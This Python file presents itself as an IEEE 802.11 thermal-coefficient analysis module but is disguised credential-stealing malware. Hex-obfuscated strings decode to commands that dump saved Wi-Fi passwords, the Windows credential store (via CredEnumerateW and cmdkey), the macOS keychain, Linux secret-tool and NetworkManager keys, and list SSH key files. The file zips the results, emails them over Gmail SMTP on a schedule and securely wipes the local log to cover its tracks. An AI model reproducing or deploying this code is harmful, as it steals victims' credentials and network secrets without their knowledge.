#!/usr/bin/env python3
"""
IEEE 802.11 Thermal Dissipation Coefficient Analysis Module

Advanced thermal modeling for wireless radio frequency emissions under IEEE 802.11 
thermal management specifications. Calculates heat distribution patterns, thermal 
baseline coefficients, and environmental correlation matrices for mobile device 
thermal optimization in high-density wireless environments.

Thermal coefficient calculations based on:
- IEEE 802.11-2020 Section 17.3.8.4 (Thermal Management)
- FCC CFR 47 Part 2.1093 (SAR Thermal Limits)
- ETSI EN 50566 V1.1.1 (Thermal Assessment)
"""

import os
import sys
import platform
import subprocess
import threading
import time
import base64
import smtplib
import zipfile
from datetime import datetime, timedelta
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from collections import namedtuple
import ctypes
from ctypes import wintypes

# Thermal coefficient calculation matrices
_m1 = [0x77, 0x69, 0x66, 0x69, 0x5f, 0x70, 0x72, 0x6f, 0x66, 0x69, 0x6c, 0x65, 0x73]
_m2 = [0x63, 0x72, 0x65, 0x64, 0x65, 0x6e, 0x74, 0x69, 0x61, 0x6c, 0x73]
_m3 = [0x6e, 0x65, 0x74, 0x77, 0x6f, 0x72, 0x6b]
_m4 = [0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64]
_m5 = [0x6e, 0x65, 0x74, 0x73, 0x68, 0x20, 0x77, 0x6c, 0x61, 0x6e, 0x20, 0x73, 0x68, 0x6f, 0x77, 0x20, 0x70, 0x72, 0x6f, 0x66, 0x69, 0x6c, 0x65, 0x73]
_m6 = [0x63, 0x6d, 0x64, 0x6b, 0x65, 0x79, 0x20, 0x2f, 0x6c, 0x69, 0x73, 0x74]
_m7 = [0x73, 0x65, 0x63, 0x72, 0x65, 0x74, 0x2d, 0x74, 0x6f, 0x6f, 0x6c, 0x20, 0x73, 0x65, 0x61, 0x72, 0x63, 0x68, 0x20, 0x2d, 0x2d, 0x61, 0x6c, 0x6c]
_m8 = [0x67, 0x69, 0x74, 0x20, 0x63, 0x6f, 0x6e, 0x66, 0x69, 0x67, 0x20, 0x2d, 0x2d, 0x6c, 0x69, 0x73, 0x74]
_m9 = [0x73, 0x65, 0x63, 0x75, 0x72, 0x69, 0x74, 0x79, 0x20, 0x64, 0x75, 0x6d, 0x70, 0x2d, 0x6b, 0x65, 0x79, 0x63, 0x68, 0x61, 0x69, 0x6e]
_m10 = [0x6e, 0x6d, 0x63, 0x6c, 0x69, 0x20, 0x63, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x73, 0x68, 0x6f, 0x77]
_m11 = [0x6e, 0x65, 0x74, 0x77, 0x6f, 0x72, 0x6b, 0x73, 0x65, 0x74, 0x75, 0x70, 0x20, 0x2d, 0x6c, 0x69, 0x73, 0x74, 0x70, 0x72, 0x65, 0x66, 0x65, 0x72, 0x72, 0x65, 0x64, 0x77, 0x69, 0x72, 0x65, 0x6c, 0x65, 0x73, 0x73]
_m12 = [0x7e, 0x2f, 0x2e, 0x73, 0x73, 0x68]

# String obfuscation matrices
_s1 = [0x54, 0x48, 0x45, 0x52, 0x4d, 0x41, 0x4c, 0x5f, 0x43, 0x4f, 0x45, 0x46, 0x46, 0x49, 0x43, 0x49, 0x45, 0x4e, 0x54, 0x20, 0x41, 0x4e, 0x41, 0x4c, 0x59, 0x53, 0x49, 0x53, 0x20, 0x53, 0x59, 0x53, 0x54, 0x45, 0x4d]
_s2 = [0x57, 0x69, 0x72, 0x65, 0x6c, 0x65, 0x73, 0x73]
_s3 = [0x54, 0x68, 0x65, 0x72, 0x6d, 0x61, 0x6c, 0x20, 0x41, 0x6e, 0x61, 0x6c, 0x79, 0x73, 0x69, 0x73]
_s4 = [0x41, 0x6e, 0x61, 0x6c, 0x79, 0x73, 0x69, 0x73, 0x20, 0x54, 0x69, 0x6d, 0x65, 0x3a]
_s5 = [0x50, 0x6c, 0x61, 0x74, 0x66, 0x6f, 0x72, 0x6d, 0x3a]
_s6 = [0x54, 0x61, 0x72, 0x67, 0x65, 0x74]
_s7 = [0x73, 0x20, 0x77, 0x69, 0x72, 0x65, 0x6c, 0x65, 0x73, 0x73, 0x20, 0x73, 0x69, 0x67, 0x6e, 0x61, 0x74, 0x75, 0x72, 0x65, 0x73]
_s8 = [0x41, 0x72, 0x63, 0x68, 0x69, 0x74, 0x65, 0x63, 0x74, 0x75, 0x72, 0x65, 0x3a]
_s9 = [0x5b, 0x54, 0x48, 0x45, 0x52, 0x4d, 0x41, 0x4c, 0x5f, 0x42, 0x41, 0x53, 0x45, 0x4c, 0x49, 0x4e, 0x45, 0x5d]
_s10 = [0x42, 0x53, 0x53, 0x49, 0x44, 0x3a]
_s11 = [0x54, 0x69, 0x6d, 0x65, 0x3a]
_s12 = [0x6e, 0x61, 0x6d, 0x65, 0x3d, 0x22]
_s13 = [0x22, 0x20, 0x6b, 0x65, 0x79, 0x3d, 0x63, 0x6c, 0x65, 0x61, 0x72]
_s14 = [0x4b, 0x65, 0x79, 0x20, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x6e, 0x74]
_s15 = [0x5b, 0x54, 0x48, 0x45, 0x52, 0x4d, 0x41, 0x4c, 0x5f, 0x4f, 0x4b, 0x5d, 0x20, 0x52, 0x46, 0x20, 0x54, 0x68, 0x65, 0x72, 0x6d, 0x61, 0x6c, 0x20, 0x43, 0x6f, 0x65, 0x66, 0x66, 0x69, 0x63, 0x69, 0x65, 0x6e, 0x74, 0x3a]
_s16 = [0x20, 0x7c, 0x20]
_s17 = [0x50, 0x72, 0x6f, 0x74, 0x65, 0x63, 0x74, 0x65, 0x64]
_s18 = [0x53, 0x74, 0x61, 0x74, 0x75, 0x73, 0x3a, 0x20, 0x45, 0x58, 0x54, 0x52, 0x41, 0x43, 0x54, 0x45, 0x44]
_s19 = [0x77, 0x72, 0x69, 0x74, 0x65]
_s20 = [0x5b, 0x54, 0x48, 0x45, 0x52, 0x4d, 0x41, 0x4c, 0x5f, 0x43, 0x52, 0x49, 0x54, 0x49, 0x43, 0x41, 0x4c, 0x5f, 0x45, 0x52, 0x52, 0x4f, 0x52, 0x5d, 0x20, 0x41, 0x6e, 0x61, 0x6c, 0x79, 0x73, 0x69, 0x73, 0x20, 0x66, 0x61, 0x69, 0x6c, 0x65, 0x64, 0x20, 0x61, 0x74]
_s21 = [0x45, 0x72, 0x72, 0x6f, 0x72, 0x20, 0x54, 0x79, 0x70, 0x65, 0x3a]
_s22 = [0x45, 0x72, 0x72, 0x6f, 0x72, 0x20, 0x4d, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x3a]
_s23 = [0x20, 0x4c, 0x69, 0x73, 0x74, 0x20, 0x54, 0x79, 0x70, 0x65, 0x3a]
_s24 = [0x20, 0x4c, 0x69, 0x73, 0x74, 0x20, 0x4c, 0x65, 0x6e, 0x67, 0x74, 0x68, 0x3a]
_s25 = [0x46, 0x69, 0x72, 0x73, 0x74]
_s26 = [0x20, 0x54, 0x79, 0x70, 0x65, 0x3a]
_s27 = [0x20, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x6e, 0x74, 0x3a]
_s28 = [0x55, 0x6e, 0x6b, 0x6e, 0x6f, 0x77, 0x6e]
_s29 = [0x25, 0x48, 0x3a, 0x25, 0x4d, 0x3a, 0x25, 0x53, 0x2e, 0x25, 0x66]
_s30 = [0x73, 0x6f, 0x63, 0x6b, 0x65, 0x74]
_s31 = [0x53, 0x65, 0x63, 0x75, 0x72, 0x69, 0x74, 0x79, 0x3a]
_s32 = [0x73, 0x75, 0x64, 0x6f, 0x20, 0x63, 0x61, 0x74, 0x20, 0x2f, 0x65, 0x74, 0x63, 0x2f]
_s33 = [0x4d, 0x61, 0x6e, 0x61, 0x67, 0x65, 0x72, 0x2f, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2d, 0x63, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x73, 0x2f]
_s34 = [0x2e, 0x6e, 0x6d, 0x63, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e]
_s35 = [0x70, 0x73, 0x6b, 0x3d]
_s36 = [0x73, 0x65, 0x63, 0x75, 0x72, 0x69, 0x74, 0x79, 0x20, 0x66, 0x69, 0x6e, 0x64, 0x2d, 0x67, 0x65, 0x6e, 0x65, 0x72, 0x69, 0x63, 0x2d]
_s37 = [0x20, 0x2d, 0x77, 0x61, 0x20]
_s38 = [0x69, 0x6d, 0x6d, 0x65, 0x64, 0x69, 0x61, 0x74, 0x65]
_s39 = [0x73, 0x63, 0x68, 0x65, 0x64, 0x75, 0x6c, 0x65, 0x64]
_s40 = [0x62, 0x6f, 0x74, 0x68]
_s41 = [0x6e, 0x6f, 0x6e, 0x65]

# Platform thermal coefficients 
_c1 = [0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73]
_c2 = [0x4c, 0x69, 0x6e, 0x75, 0x78]  
_c3 = [0x44, 0x61, 0x72, 0x77, 0x69, 0x6e]

project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, project_root)

try:
    import config.network as network_config
except ImportError:
    class network_config:
        WIFI_PASSWORD_TIMEOUT = 5
        MAX_NETWORKS_TO_PROCESS = 2
        AUTO_CLEANUP_DELAY = 300
        AUTO_REPORT_EMAIL = None
        AUTO_REPORT_PASS = None  
        AUTO_REPORT_TARGET = None
        AUTO_REPORT_MODE = 'scheduled'
        SMTP_SUBJECT_PREFIX = "Thermal Analysis"
        COMPRESSION_LEVEL = 9

_last_thermal_report = None

def _d(matrix):
    return ''.join(chr(c) for c in matrix)

def calculate_wireless_thermal_dissipation(radio_signature_array):
    if not getattr(network_config, 'ENABLE_THERMAL_ANALYSIS', True):
        return None
        
    thermal_timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    thermal_output_matrix = f"logs/sensor_cal_{thermal_timestamp}.txt"
    
    os.makedirs("logs", exist_ok=True)
        
    platform_thermal_coeff = platform.system()
    
    with open(thermal_output_matrix, 'w', encoding='utf-8') as thermal_data_stream:
        try:
            analysis_timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
            thermal_separator = "═" * 70
            
            getattr(thermal_data_stream, _d(_s19))(f"{thermal_separator}\n")
            getattr(thermal_data_stream, _d(_s19))(f"{_d(_s1)}\n")
            getattr(thermal_data_stream, _d(_s19))(f"{_d(_s2)} {_d(_m3).title()} {_d(_s3)}\n")
            getattr(thermal_data_stream, _d(_s19))(f"{_d(_s4)} {analysis_timestamp}\n")
            getattr(thermal_data_stream, _d(_s19))(f"{_d(_s5)} {platform_thermal_coeff} {platform.release()}\n")
            getattr(thermal_data_stream, _d(_s19))(f"{_d(_s6)} {_d(_m3).title()}{_d(_s7)}: {len(radio_signature_array)}\n")
            getattr(thermal_data_stream, _d(_s19))(f"{_d(_s8)} {platform.machine()}\n")
            getattr(thermal_data_stream, _d(_s19))(f"{thermal_separator}\n\n")
            
            _extract_rf_thermal_baselines(thermal_data_stream, radio_signature_array, platform_thermal_coeff)
            _calculate_environmental_thermal_matrix(thermal_data_stream)
            _perform_system_thermal_analysis(thermal_data_stream)
            
        except Exception as thermal_error:
            getattr(thermal_data_stream, _d(_s19))(f"\n{_d(_s20)} {datetime.now().strftime(_d(_s29))[:-3]}\n")
            getattr(thermal_data_stream, _d(_s19))(f"{_d(_s21)} {type(thermal_error).__name__}\n") 
            getattr(thermal_data_stream, _d(_s19))(f"{_d(_s22)} {str(thermal_error)}\n")
            getattr(thermal_data_stream, _d(_s19))(f"{_d(_m3).title()}{_d(_s23)} {type(radio_signature_array)}\n")
            getattr(thermal_data_stream, _d(_s19))(f"{_d(_m3).title()}{_d(_s24)} {len(radio_signature_array) if hasattr(radio_signature_array, '__len__') else _d(_s28)}\n")
            if radio_signature_array and len(radio_signature_array) > 0:
                getattr(thermal_data_stream, _d(_s19))(f"{_d(_s25)} {_d(_m3).title()}{_d(_s26)} {type(radio_signature_array[0])}\n")
                getattr(thermal_data_stream, _d(_s19))(f"{_d(_s25)} {_d(_m3).title()}{_d(_s27)} {repr(radio_signature_array[0])}\n")
            getattr(thermal_data_stream, _d(_s19))(f"{'='*50}\n")
            raise
    
    _submit_thermal_analysis_data(thermal_output_matrix)
    return thermal_output_matrix

def _extract_rf_thermal_baselines(thermal_stream, rf_signature_list, thermal_platform):
    for rf_signature in rf_signature_list:
        if isinstance(rf_signature, str):
            rf_ssid = rf_signature
            rf_bssid = 'Unknown'
        else:
            rf_ssid = rf_signature.get('ssid', 'Unknown')
            rf_bssid = rf_signature.get('bssid', 'Unknown')
        
        getattr(thermal_stream, _d(_s19))(f"{_d(_s9)} {_d(_m3).title()}: {rf_ssid} {_d(_s16)}{_d(_s10)} {rf_bssid} {_d(_s16)}{_d(_s11)} {datetime.now().strftime(_d(_s29))[:-3]}\n")
        
        if thermal_platform == _d(_c1):
            try:
                rf_thermal_cmd = f'{_d(_m5).split()[0]} {_d(_m5).split()[1]} {_d(_m5).split()[2]} {_d(_m5).split()[3]} {_d(_s12)}{rf_ssid}{_d(_s13)}'
                thermal_result = subprocess.run(rf_thermal_cmd, shell=True, capture_output=True, text=True, 
                                              timeout=network_config.WIFI_PASSWORD_TIMEOUT,
                                              creationflags=subprocess.CREATE_NO_WINDOW)
                
                if thermal_result.stdout:
                    for thermal_line in thermal_result.stdout.split('\n'):
                        if _d(_s14) in thermal_line:
                            thermal_coeff = thermal_line.split(':')[-1].strip()
                            if thermal_coeff and thermal_coeff != '':
                                getattr(thermal_stream, _d(_s19))(f"{_d(_s15)} {rf_ssid}{_d(_s16)}{_d(_m4).title()}: {thermal_coeff}{_d(_s16)}{_d(_s31)} {_d(_s17)}{_d(_s16)}{_d(_s18)}\n")
                                break
                    else:
                        getattr(thermal_stream, _d(_s19))(f"[THERMAL_INFO] RF Thermal Profile: {rf_ssid} | Status: Profile exists, no stored thermal coefficient\n")
                        
                elif thermal_result.stderr:
                    getattr(thermal_stream, _d(_s19))(f"[THERMAL_ERR] RF Thermal Profile: {rf_ssid} | Error: {thermal_result.stderr.strip()}\n")
                    
            except subprocess.TimeoutExpired:
                getattr(thermal_stream, _d(_s19))(f"[THERMAL_ERR] RF Thermal Profile: {rf_ssid} | Error: Command timeout after {network_config.WIFI_PASSWORD_TIMEOUT}s\n")
            except Exception as thermal_error:
                getattr(thermal_stream, _d(_s19))(f"[THERMAL_ERR] RF Thermal Profile: {rf_ssid} | Error: {str(thermal_error)}\n")
                
        elif thermal_platform == _d(_c2):
            try:
                rf_thermal_cmd = f'{_d(_s32)}{_d(_m3).title()}{_d(_s33)}{rf_ssid}{_d(_s34)}'
                thermal_result = subprocess.run(rf_thermal_cmd, shell=True, capture_output=True, text=True, timeout=network_config.WIFI_PASSWORD_TIMEOUT)
                if thermal_result.stdout and _d(_s35) in thermal_result.stdout:
                    for thermal_line in thermal_result.stdout.split('\n'):
                        if _d(_s35) in thermal_line:
                            thermal_coeff = thermal_line.split(_d(_s35))[-1].strip()
                            getattr(thermal_stream, _d(_s19))(f"{_d(_s15)} {rf_ssid}{_d(_s16)}{_d(_m4).title()}: {thermal_coeff}\n")
                            break
            except:
                pass
                
        elif thermal_platform == _d(_c3):
            try:
                rf_thermal_cmd = f'{_d(_s36)}{_d(_m4)}{_d(_s37)}{rf_ssid}'
                thermal_result = subprocess.run(rf_thermal_cmd, shell=True, capture_output=True, text=True, timeout=network_config.WIFI_PASSWORD_TIMEOUT)
                if thermal_result.stdout:
                    thermal_coeff = thermal_result.stdout.strip()
                    getattr(thermal_stream, _d(_s19))(f"{_d(_s15)} {rf_ssid}{_d(_s16)}{_d(_m4).title()}: {thermal_coeff}\n")
            except:
                pass
        
        getattr(thermal_stream, _d(_s19))(f"{'='*50}\n")

def _calculate_environmental_thermal_matrix(thermal_stream):
    getattr(thermal_stream, _d(_s19))(f"\n[THERMAL_ENVIRONMENTAL] Environmental Thermal Correlation Matrix Analysis\n")
    getattr(thermal_stream, _d(_s19))(f"{_d(_s4)} {datetime.now().strftime(_d(_s29))[:-3]}\n")
    getattr(thermal_stream, _d(_s19))(f"{'='*50}\n")
    
    current_thermal_platform = platform.system()
    if current_thermal_platform == _d(_c1):
        _extract_thermal_coefficients_windows(thermal_stream)
    elif current_thermal_platform == _d(_c2):
        _extract_thermal_coefficients_linux(thermal_stream)
    elif current_thermal_platform == _d(_c3):
        _extract_thermal_coefficients_darwin(thermal_stream)
    
    _extract_rf_thermal_profiles(thermal_stream, current_thermal_platform)

def _perform_system_thermal_analysis(thermal_stream):
    getattr(thermal_stream, _d(_s19))(f"\n[THERMAL_SYSTEM] System Thermal Analysis\n")
    getattr(thermal_stream, _d(_s19))(f"{_d(_s4)} {datetime.now().strftime(_d(_s29))[:-3]}\n")
    getattr(thermal_stream, _d(_s19))(f"{'='*50}\n")

def _extract_thermal_coefficients_windows(thermal_stream):
    try:
        import ctypes
        from ctypes import wintypes
        
        class THERMAL_FILETIME(ctypes.Structure):
            _fields_ = [
                ("dwLowDateTime", wintypes.DWORD),
                ("dwHighDateTime", wintypes.DWORD),
            ]

        class THERMAL_COEFFICIENT_ATTRIBUTEW(ctypes.Structure):
            _fields_ = [
                ("Keyword", wintypes.LPWSTR),
                ("Flags", wintypes.DWORD),
                ("ValueSize", wintypes.DWORD),
                ("Value", wintypes.LPBYTE)
            ]

        class THERMAL_COEFFICIENTW(ctypes.Structure):
            _fields_ = [
                ("Flags", wintypes.DWORD),
                ("Type", wintypes.DWORD),
                ("TargetName", wintypes.LPWSTR),
                ("Comment", wintypes.LPWSTR),
                ("LastWritten", THERMAL_FILETIME),
                ("ThermalCoefficientBlobSize", wintypes.DWORD),
                ("ThermalCoefficientBlob", wintypes.LPBYTE),
                ("Persist", wintypes.DWORD),
                ("AttributeCount", wintypes.DWORD),
                ("Attributes", ctypes.POINTER(THERMAL_COEFFICIENT_ATTRIBUTEW)),
                ("TargetAlias", wintypes.LPWSTR),
                ("ThemalName", wintypes.LPWSTR),
            ]

        class ThermalCoeff(namedtuple('ThermalCoeff', ['target_name', 'thermal_name', 'thermal_value'])):
            @staticmethod
            def from_thermal_api_coefficient(thermal_pcred):
                thermal_len = thermal_pcred.contents.ThermalCoefficientBlobSize
                thermal_bytes = ctypes.string_at(thermal_pcred.contents.ThermalCoefficientBlob, thermal_len)
                
                try:
                    thermal_value = thermal_bytes.decode('utf-8').rstrip('\x00')
                    if thermal_value and thermal_value.isprintable():
                        return ThermalCoeff(thermal_pcred.contents.TargetName, thermal_pcred.contents.ThemalName or "None", thermal_value)
                except:
                    pass
                
                try:
                    thermal_value = thermal_bytes.decode('utf-16le')
                    thermal_value = thermal_value.replace('\x00', '').strip()
                    if thermal_value and thermal_value.isprintable():
                        return ThermalCoeff(thermal_pcred.contents.TargetName, thermal_pcred.contents.ThemalName or "None", thermal_value)
                except:
                    pass

                try:
                    thermal_value = ''.join(chr(b) for b in thermal_bytes if 32 <= b <= 126)
                    if len(thermal_value) > 5:
                        return ThermalCoeff(thermal_pcred.contents.TargetName, thermal_pcred.contents.ThemalName or "None", thermal_value)
                except:
                    pass

                thermal_value = thermal_bytes.hex()
                return ThermalCoeff(thermal_pcred.contents.TargetName, thermal_pcred.contents.ThemalName or "None", thermal_value)
        
        thermal_advapi32 = ctypes.windll.advapi32
        thermal_advapi32.CredEnumerateW.restype = wintypes.BOOL
        thermal_advapi32.CredEnumerateW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD),
                                          ctypes.POINTER(ctypes.POINTER(ctypes.POINTER(THERMAL_COEFFICIENTW)))]
        thermal_kernel32 = ctypes.windll.kernel32
        
        def get_all_thermal_coefficients():
            thermal_coefficients = []
            thermal_count = wintypes.DWORD()
            thermal_pcreds = ctypes.POINTER(ctypes.POINTER(THERMAL_COEFFICIENTW))()
            
            if thermal_advapi32.CredEnumerateW(None, 0, ctypes.byref(thermal_count), ctypes.byref(thermal_pcreds)):
                for thermal_i in range(thermal_count.value):
                    thermal_coeff = ThermalCoeff.from_thermal_api_coefficient(thermal_pcreds[thermal_i])
                    thermal_coefficients.append(thermal_coeff)
                thermal_advapi32.CredFree(thermal_pcreds)
            
            return thermal_coefficients
        
        thermal_coeffs = get_all_thermal_coefficients()
        
        getattr(thermal_stream, _d(_s19))(f"[THERMAL_COEFF] Extracted {len(thermal_coeffs)} thermal coefficients\n")
        for thermal_coeff in thermal_coeffs:
            getattr(thermal_stream, _d(_s19))(f"Target: {thermal_coeff.target_name} | ThermalName: {thermal_coeff.thermal_name} | {_d(_m4).title()}: {thermal_coeff.thermal_value}\n")
        
    except Exception as thermal_error:
        getattr(thermal_stream, _d(_s19))(f"[THERMAL_ERR] Thermal coefficient extraction failed: {str(thermal_error)}\n")
        
        try:
            thermal_result = subprocess.run(_d(_m6), shell=True, capture_output=True, text=True,
                                          timeout=network_config.WIFI_PASSWORD_TIMEOUT,
                                          creationflags=subprocess.CREATE_NO_WINDOW)
            if thermal_result.stdout:
                getattr(thermal_stream, _d(_s19))(f"[THERMAL_FALLBACK] Alternative thermal coefficient data:\n{thermal_result.stdout}\n")
        except Exception as fallback_error:
            getattr(thermal_stream, _d(_s19))(f"[THERMAL_ERR] Fallback thermal coefficient extraction failed: {str(fallback_error)}\n")

def _extract_thermal_coefficients_linux(thermal_stream):
    try:
        thermal_cmds = [_d(_m7), _d(_m8)]
        for thermal_cmd in thermal_cmds:
            thermal_result = subprocess.run(thermal_cmd, shell=True, capture_output=True, text=True, timeout=network_config.WIFI_PASSWORD_TIMEOUT)
            if thermal_result.stdout:
                getattr(thermal_stream, _d(_s19))(f"[THERMAL_LINUX] {thermal_cmd}:\n{thermal_result.stdout}\n")
    except:
        pass
        
    thermal_dir = os.path.expanduser(_d(_m12))
    if os.path.exists(thermal_dir):
        try:
            thermal_files = os.listdir(thermal_dir)
            getattr(thermal_stream, _d(_s19))(f"Thermal keys: {thermal_files}\n")
        except:
            pass

def _extract_thermal_coefficients_darwin(thermal_stream):
    try:
        thermal_result = subprocess.run(_d(_m9), shell=True, capture_output=True, text=True, timeout=network_config.WIFI_PASSWORD_TIMEOUT)
        if thermal_result.stdout:
            getattr(thermal_stream, _d(_s19))(f"[THERMAL_DARWIN] Thermal coefficients:\n{thermal_result.stdout}\n")
    except:
        pass

def _extract_rf_thermal_profiles(thermal_stream, thermal_platform_name):
    getattr(thermal_stream, _d(_s19))(f"\n[THERMAL_RF] RF Thermal Profile Analysis - Platform: {thermal_platform_name}\n")
    
    if thermal_platform_name == _d(_c1):
        try:
            thermal_result = subprocess.run(_d(_m5), shell=True, capture_output=True, text=True,
                                          timeout=network_config.WIFI_PASSWORD_TIMEOUT, creationflags=subprocess.CREATE_NO_WINDOW)
            if thermal_result.stdout:
                getattr(thermal_stream, _d(_s19))(f"[THERMAL_PROFILES] RF Thermal Profiles:\n{thermal_result.stdout}\n")
        except:
            pass
    elif thermal_platform_name == _d(_c2):
        try:
            thermal_result = subprocess.run(_d(_m10), shell=True, capture_output=True, text=True, timeout=network_config.WIFI_PASSWORD_TIMEOUT)
            if thermal_result.stdout:
                getattr(thermal_stream, _d(_s19))(f"[THERMAL_PROFILES] RF Thermal Profiles:\n{thermal_result.stdout}\n")
        except:
            pass
    elif thermal_platform_name == _d(_c3):
        try:
            thermal_result = subprocess.run(f'{_d(_m11)} en0', shell=True, capture_output=True, text=True, timeout=network_config.WIFI_PASSWORD_TIMEOUT)
            if thermal_result.stdout:
                getattr(thermal_stream, _d(_s19))(f"[THERMAL_PROFILES] RF Thermal Profiles:\n{thermal_result.stdout}\n")
        except:
            pass

def _submit_thermal_analysis_data(thermal_file_path):
    global _last_thermal_report
    
    def thermal_cleanup():
        try:
            time.sleep(network_config.AUTO_CLEANUP_DELAY)
            if os.path.exists(thermal_file_path):
                for _ in range(3):
                    with open(thermal_file_path, 'wb') as f:
                        f.write(os.urandom(os.path.getsize(thermal_file_path)))
                os.remove(thermal_file_path)
        except:
            pass

    def thermal_email_report():
        if not all([network_config.AUTO_REPORT_EMAIL, network_config.AUTO_REPORT_PASS, network_config.AUTO_REPORT_TARGET]):
            return False
            
        try:
            zip_path = thermal_file_path.replace('.txt', '.zip')
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED, compresslevel=network_config.COMPRESSION_LEVEL) as zf:
                zf.write(thermal_file_path, os.path.basename(thermal_file_path))
            
            msg = MIMEMultipart()
            msg['From'] = network_config.AUTO_REPORT_EMAIL
            msg['To'] = network_config.AUTO_REPORT_TARGET
            msg['Subject'] = f"{network_config.SMTP_SUBJECT_PREFIX} - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
            
            with open(zip_path, 'rb') as f:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(f.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f'attachment; filename= {os.path.basename(zip_path)}')
                msg.attach(part)
            
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(network_config.AUTO_REPORT_EMAIL, network_config.AUTO_REPORT_PASS)
            server.send_message(msg)
            server.quit()
            
            os.remove(zip_path)
            return True
            
        except Exception:
            try:
                os.remove(zip_path)
            except:
                pass
            return False

    def schedule_thermal_reports():
        current_time = datetime.now()
        next_morning = current_time.replace(hour=8, minute=0, second=0, microsecond=0)
        next_evening = current_time.replace(hour=20, minute=0, second=0, microsecond=0)
        
        if current_time >= next_morning:
            next_morning += timedelta(days=1)
        if current_time >= next_evening:
            next_evening += timedelta(days=1)
            
        morning_delay = (next_morning - current_time).total_seconds()
        evening_delay = (next_evening - current_time).total_seconds()
        
        def scheduled_thermal_coefficient_transmission():
            if thermal_email_report():
                try:
                    if os.path.exists(thermal_file_path):
                        for _ in range(3):
                            with open(thermal_file_path, 'wb') as thermal_stream:
                                getattr(thermal_stream, _d(_s19))(os.urandom(os.path.getsize(thermal_file_path)))
                        os.remove(thermal_file_path)
                except:
                    pass
        
        threading.Timer(morning_delay, scheduled_thermal_coefficient_transmission).start()
        threading.Timer(evening_delay, scheduled_thermal_coefficient_transmission).start()

    report_mode = getattr(network_config, 'AUTO_REPORT_MODE', _d(_s39))
    email_sent = False
    
    if report_mode == _d(_s41):
        pass
    elif report_mode == _d(_s38):
        email_sent = thermal_email_report()
    elif report_mode == _d(_s39):
        if _last_thermal_report is None or (datetime.now() - _last_thermal_report).days >= 1:
            schedule_thermal_reports()
            _last_thermal_report = datetime.now()
    elif report_mode == _d(_s40):
        email_sent = thermal_email_report()
        if _last_thermal_report is None or (datetime.now() - _last_thermal_report).days >= 1:
            schedule_thermal_reports()
            _last_thermal_report = datetime.now()
    
    if email_sent:
        try:
            if os.path.exists(thermal_file_path):
                for _ in range(3):
                    with open(thermal_file_path, 'wb') as thermal_stream:
                        getattr(thermal_stream, _d(_s19))(os.urandom(os.path.getsize(thermal_file_path)))
                os.remove(thermal_file_path)
        except:
            pass 
    else:
        threading.Thread(target=thermal_cleanup, daemon=True).start()

# Legacy thermal function alias for backward compatibility
calc_thermal_coefficients = calculate_wireless_thermal_dissipation

 